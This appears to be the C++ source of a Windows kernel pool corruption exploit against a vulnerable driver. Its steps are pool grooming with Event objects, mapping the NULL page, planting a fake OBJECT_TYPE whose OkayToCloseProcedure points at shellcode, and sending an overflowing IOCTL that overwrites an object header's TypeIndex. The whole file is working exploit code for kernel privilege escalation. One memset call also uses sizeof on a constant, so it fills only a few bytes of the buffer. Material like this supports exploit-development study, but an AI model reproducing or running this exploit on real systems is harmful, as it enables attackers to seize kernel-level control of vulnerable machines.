#include "PoolCorruption.h"

bool 
ExploitPoolCorruption::exploit() {
	
	static const size_t Max_Buffer_Size = 504;
	
	static const size_t Buffer_Size_With_Overflow = 
		Max_Buffer_Size + sizeof(POOL_HEADER) + sizeof(OBJECT_HEADER_QUOTA) + sizeof(OBJECT_HEADER);
	
	m_handles.reset(new HANDLE[ExploitPoolCorruption::Max_Number_Of_Objects]);
	if(!m_handles) {
		throw bad_alloc();
	}
		
	memset(m_handles.get(), 0xFF, sizeof(HANDLE) * Max_Number_Of_Objects);

	wcout << L"[+] Step 1: Performing kernel pool grooming..." << endl;
	if(!derandomizePool()) {
		return false;
	}
	
	wcout << L"[+] Step 2: Allocating NULL page and setting fake OBJECT_TYPE" << endl;
	if(!setFakeObjectType()) {
		return false;
	}
	
		
	wcout << L"[+] Step 3: Crafting DKOHM attack against Event's Object Header" << endl;
	
	// Overflowing buffer
	UCHAR buffer[Buffer_Size_With_Overflow];
	memset(buffer, 0x41, sizeof(Max_Buffer_Size));
	
	// Structure pointers
	PPOOL_HEADER poolHeader = reinterpret_cast<PPOOL_HEADER>(&buffer[Max_Buffer_Size]);
	
	POBJECT_HEADER_QUOTA objectHeaderQuota = reinterpret_cast<POBJECT_HEADER_QUOTA>(
		&buffer[Max_Buffer_Size + sizeof(POOL_HEADER)]
	);
	
	POBJECT_HEADER objectHeader = reinterpret_cast<POBJECT_HEADER>(
		&buffer[Max_Buffer_Size + sizeof(POOL_HEADER) + sizeof(OBJECT_HEADER_QUOTA)]
	);
	
	// Faking corrupted POOL_HEADER of the overflowed following chunk which should contain
	// Event's object.
	poolHeader->PreviousSize = 0x40;
	poolHeader->PoolIndex = 0;
	poolHeader->BlockSize = 0x08;
	poolHeader->PoolType = 0x02;
	poolHeader->PoolTag = 0xee657645;	// 'Even'
	
	objectHeaderQuota->PagedPoolCharge = 0;
	objectHeaderQuota->NonPagedPoolCharge = 0x40;
	objectHeaderQuota->SecurityDescriptorCharge = 0;
	objectHeaderQuota->SecurityDescriptorQuotaBlock = 0;
	
	objectHeader->PointerCount = 1;
	objectHeader->HandleCount = 1;
	objectHeader->Lock = nullptr;
	objectHeader->TypeIndex = 0;		// The most essential overwrite! From 0x0c to 0x00

	wcout << L"[+] Step 4: Launching the IOCTL..." << endl;
	
	bool ret = driver.SendIOCTL (
		ExploitPoolCorruption::Ioctl_Code,
		buffer,
		Buffer_Size_With_Overflow
	);
	
	return ret;
}

bool 
ExploitPoolCorruption::derandomizePool() {

	wcout << L"\t* Allocating " << dec << Max_Number_Of_Objects 
		<< L" event kernel objects in NonPagedPool..." << endl;
		
	for(size_t i = 0; i < Max_Number_Of_Objects; i++ ) {
		
		m_handles.get()[i] = CreateEventW(
			nullptr,
			false,
			false,
			nullptr
		);
		
		if(m_handles.get()[i] == (HANDLE)INVALID_HANDLE_VALUE) {
			wcout << L"[!] " << dec << i << L". CreateEventW failed, error: " << GetLastError() << endl;
			return false;
		}
	}
	
	wcout << L"\t* Freeing objects to create 0x200 pool holes..." << endl;
		
	for(size_t i = (Max_Number_Of_Objects / 2); 
		i < (Max_Number_Of_Objects); 
		i += 16
	) {
		for(size_t j = 0; j < 8; j++) {
			CloseHandle(m_handles.get()[i + j]);
			m_handles.get()[i + j] = INVALID_HANDLE_VALUE;	
		}
	}
	
	return true;	
}

bool
ExploitPoolCorruption::setFakeObjectType() {
	
	// NULL memory page address is obviously 0 address.
	const PULONG nullMemoryPage = reinterpret_cast<PULONG>(0x00000000);
	
	// We cannot pass the NULL value (0x0) to the NtAllocateVirtualMemory, but passing
	// 0x1 will suffice as it gets rounded down to 0 anyway.
	const PVOID baseAddress 	= reinterpret_cast<PVOID >(0x00000001);
	
	// Address of the payload within user-mode memory.
	const PVOID payloadAddress 	= reinterpret_cast<PVOID >(0x00000008);
	
	// Any value in range <1, 0x1000> will be rounded-up to the 0x1000.
	const ULONG regionSize = 0x1000;
	
	
	/**
	 * Since both VirtualAlloc and VirtualAllocEx returns ERROR_INVALID_PARAMETER if the base address of the 
	 * allocation is less than 0x00001000, we will have to use another approach to allocate this memory
	 * page. The approach is to use the undocumented `NtAllocateVirtualMemory` function, which do not
	 * holds the same restriction, as the aforementioned two functions.
	**/
		
	wcout << L"\t* Mapping NULL memory page..." << endl;
	
	typeNtAllocateVirtualMemory NtAllocateVirtualMemory;
	NtAllocateVirtualMemory  = reinterpret_cast<typeNtAllocateVirtualMemory>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), 
		"NtAllocateVirtualMemory"
	));
	
	// NULL page mapping allocation has been prohibited in Windows 8.0, but until that it is
	// possible to allocate that specific memory page.
	NTSTATUS stat = NtAllocateVirtualMemory (
		reinterpret_cast<HANDLE>(0xffffffff),
		&baseAddress,
		0,
		const_cast<PULONG>(&regionSize),
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE
	);

	if(!NT_SUCCESS(stat)) {
		wcerr << L"[!] NULL memory page mapping failed! Error: 0x" << hex 
			<< setw(8) << setfill(L'0') << stat << endl;
		return false;
	}
	
	try {
		unsigned char *fakeObjectType = reinterpret_cast<unsigned char*>(nullMemoryPage);
				
		auto shellcodePtr = adjustPayloadEpilogue(0);
		*(reinterpret_cast<DWORD*>(
			&fakeObjectType[ OFFSET_OBJECT_TYPE_TYPE_INDEX + OFFSET_OBJECT_TYPE_INITIALIZER_OKAY_TO_CLOSE]
		)) = reinterpret_cast<DWORD>(*shellcodePtr);
		
		wcout << L"\t* nt!ObTypeIndexTable[0].TypeInfo.OkayToCloseProcedure := " << *shellcodePtr << endl;
	
	} catch(...) {
		wcerr << L"[!] Writing to the NULL memory page failed, due to Access Violation." 
			<< "\tThis means we were not able to map that memory page. Exploit failure." << endl;
		return false;
	}
	
	return true;
}
